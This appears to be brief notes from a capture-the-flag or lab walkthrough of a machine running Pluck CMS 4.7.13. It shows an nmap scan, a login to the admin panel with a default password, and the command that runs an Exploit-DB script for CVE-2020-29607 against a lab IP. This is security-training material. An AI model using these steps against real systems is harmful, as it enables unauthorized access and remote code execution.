first check out open ports 

```bash
nmap 0.0.0.0 -sV -Pn -sC
```

there is open port 80, some page

`http://10.201.48.24/app/pluck-4.7.13/admin.php?action=page`

after digging find admin panel with default credentaials like `password` used and log in to web panel there in login page i found version and find online `CVE-2020-29607`

works fine 
```bash
python /usr/share/exploitdb/exploits/php/webapps/49909.py 10.201.48.24 80 password /app/pluck-4.7.13/login.php
```

